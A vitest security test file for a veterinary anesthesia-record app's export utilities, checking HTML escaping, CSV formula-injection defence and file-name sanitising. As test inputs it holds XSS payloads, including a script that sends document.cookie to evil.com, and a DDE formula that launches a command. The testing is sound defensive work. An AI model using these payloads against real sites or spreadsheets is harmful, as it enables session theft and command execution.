import { describe, it, expect } from 'vitest';
import { escapeHTML, escapeCSV, sanitizeFileName } from '../utils/formatters';
import { generateCSV } from '../utils/csv';
import { AnesthesiaSession, VitalRecord } from '../models';

// ============================================================
// Phase 2: PDF/CSV 匯出安全測試
// 目的：驗證 HTML 跳脫、CSV 注入防禦、檔名消毒
// ============================================================

describe('escapeHTML — XSS 防禦', () => {
  it('一般文字不變', () => {
    expect(escapeHTML('hello world')).toBe('hello world');
  });

  it('空字串不變', () => {
    expect(escapeHTML('')).toBe('');
  });

  it('跳脫 < 和 >', () => {
    expect(escapeHTML('<script>')).toBe('&lt;script&gt;');
  });

  it('跳脫 &', () => {
    expect(escapeHTML('A & B')).toBe('A &amp; B');
  });

  it('跳脫雙引號', () => {
    expect(escapeHTML('"hello"')).toBe('&quot;hello&quot;');
  });

  it('跳脫單引號', () => {
    expect(escapeHTML("it's")).toBe('it&#39;s');
  });

  it('完整 XSS payload 被跳脫', () => {
    const payload = '<script>alert("xss")</script>';
    const escaped = escapeHTML(payload);
    expect(escaped).not.toContain('<script>');
    expect(escaped).not.toContain('</script>');
    expect(escaped).toContain('&lt;script&gt;');
  });

  it('img onerror payload 被跳脫', () => {
    const payload = '<img src=x onerror=alert(1)>';
    const escaped = escapeHTML(payload);
    expect(escaped).not.toContain('<img');
    expect(escaped).toContain('&lt;img');
  });

  it('iframe payload 被跳脫', () => {
    const payload = '<iframe src="javascript:alert(1)">';
    const escaped = escapeHTML(payload);
    expect(escaped).not.toContain('<iframe');
  });

  it('HTML 屬性逃逸 payload 被跳脫', () => {
    const payload = '"></td><script>alert(1)</script><td>"';
    const escaped = escapeHTML(payload);
    expect(escaped).not.toContain('<script>');
    expect(escaped).not.toContain('</td>');
  });

  it('Cookie 竊取 payload 被跳脫', () => {
    const payload = '<script>document.location="http://evil.com/?c="+document.cookie</script>';
    const escaped = escapeHTML(payload);
    expect(escaped).not.toContain('<script>');
  });
});

describe('escapeCSV — 公式注入防禦', () => {
  it('一般文字不變', () => {
    expect(escapeCSV('hello')).toBe('hello');
  });

  it('含逗號 → 用引號包裹', () => {
    expect(escapeCSV('a,b')).toBe('"a,b"');
  });

  it('含雙引號 → escape 並包裹', () => {
    expect(escapeCSV('say "hi"')).toBe('"say ""hi"""');
  });

  it('含換行 → 用引號包裹', () => {
    expect(escapeCSV('line1\nline2')).toBe('"line1\nline2"');
  });

  // --- 公式注入防禦 ---
  it('= 開頭 → 加前綴防禦', () => {
    const result = escapeCSV('=CMD|"/C calc"!A0');
    expect(result.startsWith('=')).toBe(false);
  });

  it('+ 開頭 → 加前綴防禦', () => {
    const result = escapeCSV('+SUM(A1:A100)');
    expect(result.startsWith('+')).toBe(false);
  });

  it('- 開頭（非負數）→ 加前綴防禦', () => {
    const result = escapeCSV('-1+1');
    // 注意：純負數如 "-5" 不應被改變，但 "-1+1" 是公式
    expect(result.startsWith('-')).toBe(false);
  });

  it('@ 開頭 → 加前綴防禦', () => {
    const result = escapeCSV('@SUM(A1)');
    expect(result.startsWith('@')).toBe(false);
  });

  it('數字 0 → "0"', () => {
    expect(escapeCSV(0)).toBe('0');
  });

  it('數字 -5 → "-5"（負數不視為公式）', () => {
    expect(escapeCSV(-5)).toBe('-5');
  });
});

describe('sanitizeFileName — 檔名消毒', () => {
  it('正常檔名不變', () => {
    expect(sanitizeFileName('case001')).toBe('case001');
  });

  it('含 / → 替換', () => {
    expect(sanitizeFileName('2024/001')).not.toContain('/');
  });

  it('含 \\ → 替換', () => {
    expect(sanitizeFileName('case\\001')).not.toContain('\\');
  });

  it('含 : → 替換', () => {
    expect(sanitizeFileName('case:001')).not.toContain(':');
  });

  it('含 * ? " < > | → 全部替換', () => {
    const result = sanitizeFileName('case*?"<>|001');
    expect(result).not.toMatch(/[*?"<>|]/);
  });

  it('中文字元保留', () => {
    expect(sanitizeFileName('病例001')).toBe('病例001');
  });

  it('空字串 → fallback', () => {
    expect(sanitizeFileName('')).toBeTruthy();
  });
});

describe('generateCSV — 邊界測試', () => {
  const makeSession = (overrides: Partial<AnesthesiaSession> = {}): AnesthesiaSession => ({
    id: 'test-id',
    patientInfo: {
      hospitalName: '測試醫院',
      patientName: '小白',
      caseNumber: 'C001',
      weight: 5,
      species: 'dog',
    },
    startTime: '2026-01-01T10:00:00.000Z',
    records: [],
    ...overrides,
  });

  const makeRecord = (overrides: Partial<VitalRecord> = {}): VitalRecord => ({
    timestamp: '2026-01-01T10:05:00.000Z',
    systolicBP: 120,
    diastolicBP: 80,
    meanBP: 93,
    heartRate: 80,
    respiratoryRate: 15,
    spO2: 98,
    etCO2: 35,
    anesthesiaConc: 2.0,
    temperature: 38.0,
    notes: '',
    ...overrides,
  });

  it('0 筆記錄 → CSV 只含標頭', () => {
    const csv = generateCSV(makeSession());
    expect(csv).toContain('病患資料');
    expect(csv).toContain('生理數值記錄');
  });

  it('所有生理值為 null → 對應欄位為空', () => {
    const record = makeRecord({
      systolicBP: null, diastolicBP: null, meanBP: null,
      heartRate: null, respiratoryRate: null, spO2: null,
      etCO2: null, anesthesiaConc: null, temperature: null,
    });
    const csv = generateCSV(makeSession({ records: [record] }));
    const lines = csv.split('\n');
    const dataLine = lines[lines.length - 1];
    // 應有多個連續逗號（空值）
    expect(dataLine).toContain(',,');
  });

  it('species 不在 SPECIES_LABELS → 不應輸出 "undefined"', () => {
    const session = makeSession();
    (session.patientInfo as any).species = 'rabbit';
    const csv = generateCSV(session);
    expect(csv).not.toContain('undefined');
  });

  it('notes 含公式字元 → CSV 中應被防禦', () => {
    const record = makeRecord({ notes: '=CMD|"/C calc"!A0' });
    const csv = generateCSV(makeSession({ records: [record] }));
    // 確認公式字元被防禦
    const lines = csv.split('\n');
    const dataLine = lines[lines.length - 1];
    // notes 是最後一個欄位
    expect(dataLine).not.toMatch(/,=CMD/);
  });
});
